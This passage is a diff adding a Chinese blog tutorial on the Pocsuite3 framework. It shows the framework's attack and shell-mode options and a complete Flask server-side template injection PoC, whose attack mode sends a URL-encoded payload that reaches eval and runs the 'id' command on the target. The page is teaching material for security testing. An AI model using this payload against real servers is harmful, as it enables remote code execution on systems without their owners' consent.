+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">optional arguments:
+</span></span><span class="line"><span class="cl">  -h, --help            show this <span class="nb">help</span> message and <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">  --version             Show program<span class="err">&#39;</span>s version number and <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">  --update              Update Pocsuite
+</span></span><span class="line"><span class="cl">  -v <span class="o">{</span>0,1,2,3,4,5,6<span class="o">}</span>    Verbosity level: 0-6 <span class="o">(</span>default 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target:
+</span></span><span class="line"><span class="cl">  At least one of these options has to be provided to define the target<span class="o">(</span>s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  -u URL <span class="o">[</span>URL ...<span class="o">]</span>, --url URL <span class="o">[</span>URL ...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">                        Target URL <span class="o">(</span>e.g. <span class="s2">&#34;http://www.site.com/vuln.php?id=1&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  -f URL_FILE, --file URL_FILE
+</span></span><span class="line"><span class="cl">                        Scan multiple targets given in a textual file
+</span></span><span class="line"><span class="cl">  -r POC <span class="o">[</span>POC ...<span class="o">]</span>      Load POC file from <span class="nb">local</span> or remote from seebug website
+</span></span><span class="line"><span class="cl">  -c CONFIGFILE         Load options from a configuration INI file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode:
+</span></span><span class="line"><span class="cl">  Pocsuite running mode options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --verify              Run poc with verify mode
+</span></span><span class="line"><span class="cl">  --attack              Run poc with attack mode
+</span></span><span class="line"><span class="cl">  --shell               Run poc with shell mode
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Request:
+</span></span><span class="line"><span class="cl">  Network request options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --cookie COOKIE       HTTP Cookie header value
+</span></span><span class="line"><span class="cl">  --host HOST           HTTP Host header value
+</span></span><span class="line"><span class="cl">  --referer REFERER     HTTP Referer header value
+</span></span><span class="line"><span class="cl">  --user-agent AGENT    HTTP User-Agent header value
+</span></span><span class="line"><span class="cl">  --random-agent        Use randomly selected HTTP User-Agent header value
+</span></span><span class="line"><span class="cl">  --proxy PROXY         Use a proxy to connect to the target URL
+</span></span><span class="line"><span class="cl">  --proxy-cred PROXY_CRED
+</span></span><span class="line"><span class="cl">                        Proxy authentication credentials <span class="o">(</span>name:password<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  --timeout TIMEOUT     Seconds to <span class="nb">wait</span> before timeout connection <span class="o">(</span>default 30<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  --retry RETRY         Time out retrials times.
+</span></span><span class="line"><span class="cl">  --delay DELAY         Delay between two request of one thread
+</span></span><span class="line"><span class="cl">  --headers HEADERS     Extra headers <span class="o">(</span>e.g. <span class="s2">&#34;key1: value1\nkey2: value2&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Account:
+</span></span><span class="line"><span class="cl">  Telnet404、Shodan、CEye、Fofa account options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --login-user LOGIN_USER
+</span></span><span class="line"><span class="cl">                        Telnet404 login user
+</span></span><span class="line"><span class="cl">  --login-pass LOGIN_PASS
+</span></span><span class="line"><span class="cl">                        Telnet404 login password
+</span></span><span class="line"><span class="cl">  --shodan-token SHODAN_TOKEN
+</span></span><span class="line"><span class="cl">                        Shodan token
+</span></span><span class="line"><span class="cl">  --fofa-user FOFA_USER
+</span></span><span class="line"><span class="cl">                        fofa user
+</span></span><span class="line"><span class="cl">  --fofa-token FOFA_TOKEN
+</span></span><span class="line"><span class="cl">                        fofa token
+</span></span><span class="line"><span class="cl">  --censys-uid CENSYS_UID
+</span></span><span class="line"><span class="cl">                        Censys uid
+</span></span><span class="line"><span class="cl">  --censys-secret CENSYS_SECRET
+</span></span><span class="line"><span class="cl">                        Censys secret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Modules:
+</span></span><span class="line"><span class="cl">  Modules<span class="o">(</span>Seebug、Zoomeye、CEye、Fofa Listener<span class="o">)</span> options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --dork DORK           Zoomeye dork used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --dork-zoomeye DORK_ZOOMEYE
+</span></span><span class="line"><span class="cl">                        Zoomeye dork used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --dork-shodan DORK_SHODAN
+</span></span><span class="line"><span class="cl">                        Shodan dork used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --dork-censys DORK_CENSYS
+</span></span><span class="line"><span class="cl">                        Censys dork used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --dork-fofa DORK_FOFA
+</span></span><span class="line"><span class="cl">                        Fofa dork used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --max-page MAX_PAGE   Max page used in ZoomEye API<span class="o">(</span><span class="m">10</span> targets/Page<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">  --search-type SEARCH_TYPE
+</span></span><span class="line"><span class="cl">                        search <span class="nb">type</span> used in ZoomEye API, web or host
+</span></span><span class="line"><span class="cl">  --vul-keyword VUL_KEYWORD
+</span></span><span class="line"><span class="cl">                        Seebug keyword used <span class="k">for</span> search.
+</span></span><span class="line"><span class="cl">  --ssv-id SSVID        Seebug SSVID number <span class="k">for</span> target PoC.
+</span></span><span class="line"><span class="cl">  --lhost CONNECT_BACK_HOST
+</span></span><span class="line"><span class="cl">                        Connect back host <span class="k">for</span> target PoC in shell mode
+</span></span><span class="line"><span class="cl">  --lport CONNECT_BACK_PORT
+</span></span><span class="line"><span class="cl">                        Connect back port <span class="k">for</span> target PoC in shell mode
+</span></span><span class="line"><span class="cl">  --comparison          Compare popular web search engines
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Optimization:
+</span></span><span class="line"><span class="cl">  Optimization options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --plugins PLUGINS     Load plugins to execute
+</span></span><span class="line"><span class="cl">  --pocs-path POCS_PATH
+</span></span><span class="line"><span class="cl">                        User defined poc scripts path
+</span></span><span class="line"><span class="cl">  --threads THREADS     Max number of concurrent network requests <span class="o">(</span>default 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  --batch BATCH         Automatically choose defaut choice without asking.
+</span></span><span class="line"><span class="cl">  --requires            Check install_requires
+</span></span><span class="line"><span class="cl">  --quiet               Activate quiet mode, working without logger.
+</span></span><span class="line"><span class="cl">  --ppt                 Hiden sensitive information when published to the
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="编写poc插件">编写POC插件</h3>
+<blockquote>
+<p>详见pocsuite3下docs目录</p>
+</blockquote>
+<h4 id="poc注意事项">POC注意事项</h4>
+<ul>
+<li>参照模版来写：模版地址：https://www.seebug.org/contribute/vul</li>
+<li>引入基础库，尽量避免第三方库。</li>
+<li>比较好的POC符合：</li>
+<li>随机性：检测的数据，发送的数据要随机</li>
+<li>通用性：考虑适应版本，各种不同的情况，操作系统等。</li>
+<li>确定性：准确率的问题，这个POC一定能检测出漏洞来吗？</li>
+<li>关于CEYE的使用：监视服务以进行安全测试
+有时一些漏洞的检测并没有数据回显，如SQL盲注，如命令执行无回显等等。这时可以借助DNS查询nslook或者curl来监控数据。CEYE为我们提供了这样一种服务，地址：http://ceye.io。</li>
+</ul>
+<h4 id="举例">举例</h4>
+<p>这里以Flask SSTI为例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span><span class="lnt">98
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">功能：使用pocsuite对flask模板注入进行检测和利用
+</span></span></span><span class="line"><span class="cl"><span class="s2">@author: 剑胆琴心
+</span></span></span><span class="line"><span class="cl"><span class="s2">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">__class__  返回类型所属的对象（类）
+</span></span></span><span class="line"><span class="cl"><span class="s2">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+</span></span></span><span class="line"><span class="cl"><span class="s2">__base__   返回该对象所继承的基类
+</span></span></span><span class="line"><span class="cl"><span class="s2">// __base__和__mro__都是用来寻找基类的
+</span></span></span><span class="line"><span class="cl"><span class="s2">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+</span></span></span><span class="line"><span class="cl"><span class="s2">__init__  类的初始化方法
+</span></span></span><span class="line"><span class="cl"><span class="s2">__globals__  对包含函数全局变量的字典的引用
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pocsuite3.api</span> <span class="kn">import</span> <span class="n">Output</span><span class="p">,</span> <span class="n">POCBase</span><span class="p">,</span> <span class="n">register_poc</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">logger</span><span class="p">,</span> <span class="n">VUL_TYPE</span><span class="p">,</span> <span class="n">POC_CATEGORY</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from pocsuite3.api import get_listener_ip, get_listener_port</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from pocsuite3.api import REVERSE_PAYLOAD</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from pocsuite3.lib.utils import random_str</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FlaskPOCEXP</span><span class="p">(</span><span class="n">POCBase</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    0.编写的文件名应该符合poc命名规范：&#34;组成漏洞应用名_版本号_漏洞类型名称&#34;, 其中文件名中所有字母改为小写，所有特殊符号改为下划线
+</span></span></span><span class="line"><span class="cl"><span class="s1">    1.编写DemoPOC类，继承自POCBase类
+</span></span></span><span class="line"><span class="cl"><span class="s1">    2.填写POC信息字段（如下）：
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vulID</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="c1"># ssvid ID，如果是提交漏洞同时提交POC，写成0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">version</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span>   <span class="c1"># 默认为1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">author</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;剑胆琴心&#39;</span><span class="p">]</span>     <span class="c1"># POC作者的名字</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vulDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>  <span class="c1"># 漏洞公开的时间，不明确时可以写今天（我瞎写的时间）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">createDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">updateDate</span> <span class="o">=</span> <span class="s1">&#39;2021-01-11&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;http://www.xpshuai.cn&#39;</span><span class="p">]</span>  <span class="c1"># 漏洞地址来源，0day可以不写</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;Python Flask SSTI(服务端模板注入)漏洞&#39;</span>      <span class="c1"># POC名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appPowerLink</span> <span class="o">=</span> <span class="s1">&#39;http://www.xpshuai.cn&#39;</span>   <span class="c1"># 漏洞厂商的主页地址</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appName</span> <span class="o">=</span> <span class="s1">&#39;Flask&#39;</span>       <span class="c1"># 漏洞应用名称</span>
+</span></span><span class="line"><span class="cl">    <span class="n">appVersion</span> <span class="o">=</span> <span class="s1">&#39;All&#39;</span>      <span class="c1"># 漏洞影响版本</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># vulType = VUL_TYPE.OTHER      # 漏洞类型(这里我瞎选的)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">desc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        SSTI(Server-Side Template Injection)服务端模板注入，
+</span></span></span><span class="line"><span class="cl"><span class="s1">        就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">samples</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="p">]</span>  <span class="c1"># 漏洞样例，使用poc测试成功的网站</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># PoC 第三方模块依赖说明。PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式：install_requies = [pip时候的模块名, pip时候的模块名]填写依赖的模块名。</span>
+</span></span><span class="line"><span class="cl">    <span class="n">install_requies</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        验证模式
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 这里写验证代码...</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;/?name=&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;{{22*22}}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 第一次请求</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">resq</span> <span class="ow">and</span> <span class="n">resq</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;484&#34;</span> <span class="ow">in</span> <span class="n">resq</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>   <span class="c1"># 创建自定义的字典信息</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;URL&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;Payload&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        攻击模式
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;/?name=&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%7B</span><span class="si">%25%</span><span class="s2">20for</span><span class="si">%20c%20i</span><span class="s2">n</span><span class="si">%20%</span><span class="s2">5B%5D.__class__.__base__.__subclasses__()</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20if</span><span class="si">%20c</span><span class="s2">.__name__</span><span class="si">%20%</span><span class="s2">3D%3D</span><span class="si">%20%</span><span class="s2">27catch_warnings</span><span class="si">%27%</span><span class="s2">20</span><span class="si">%25%</span><span class="s2">7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20for%20b</span><span class="si">%20i</span><span class="s2">n</span><span class="si">%20c</span><span class="s2">.__init__.__globals__.values()</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20if%20b.__class__</span><span class="si">%20%</span><span class="s2">3D%3D</span><span class="si">%20%</span><span class="s2">7B%7D.__class__</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20if</span><span class="si">%20%</span><span class="s2">27eval</span><span class="si">%27%</span><span class="s2">20in%20b.keys()</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B%7B%20b%5B</span><span class="si">%27e</span><span class="s2">val</span><span class="si">%27%</span><span class="s2">5D(%27__import__(</span><span class="si">%22o</span><span class="s2">s%22).popen(</span><span class="si">%22i</span><span class="s2">d%22).read()%27)</span><span class="si">%20%</span><span class="s2">7D%7D%0A</span><span class="si">%20%</span><span class="s2">20</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A</span><span class="si">%20%</span><span class="s2">20%7B</span><span class="si">%25%</span><span class="s2">20endfor</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20endif</span><span class="si">%20%</span><span class="s2">25%7D%0A%7B</span><span class="si">%25%</span><span class="s2">20endfor</span><span class="si">%20%</span><span class="s2">25%7D&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">resq</span> <span class="ow">and</span> <span class="n">resq</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s2">&#34;www&#34;</span> <span class="ow">in</span> <span class="n">resq</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;URL&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;VerifyInfo&#39;</span><span class="p">][</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">parse_output</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">     	检测返回结果数据统一封装到这个方法里进行处理
+</span></span></span><span class="line"><span class="cl"><span class="s1">     	&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">Output</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">fail</span><span class="p">(</span><span class="s1">&#39;target is not vulnerable&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">output</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 注册POC类，千万不要忘记哦~~~</span>
+</span></span><span class="line"><span class="cl"><span class="n">register_poc</span><span class="p">(</span><span class="n">FlaskPOCEXP</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若是压缩包方式下载的：放到pocsuite下的pocs目录，然后<code>python cli.py xxxxx</code>方式运行</p>
+<p>若是pip方式下载的：按下面方式</p>
+<p>验证漏洞：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --attack
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/flask_ssti_verify.png"
+    data-srcset="http://image.xpshuai.cn/flask_ssti_verify.png, http://image.xpshuai.cn/flask_ssti_verify.png 1.5x, http://image.xpshuai.cn/flask_ssti_verify.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/flask_ssti_verify.png"
+    title="http://image.xpshuai.cn/flask_ssti_verify.png"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/flask_ssti_attack.png"
+    data-srcset="http://image.xpshuai.cn/flask_ssti_attack.png, http://image.xpshuai.cn/flask_ssti_attack.png 1.5x, http://image.xpshuai.cn/flask_ssti_attack.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/flask_ssti_attack.png"
+    title="http://image.xpshuai.cn/flask_ssti_attack.png"/></p>
+<h4 id="command外部参数传递"><code>command</code>外部参数传递。</h4>
+<p><strong>改进一下</strong>，希望可以接收用户输入的命令行参数，对目标系统实现半交互控制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
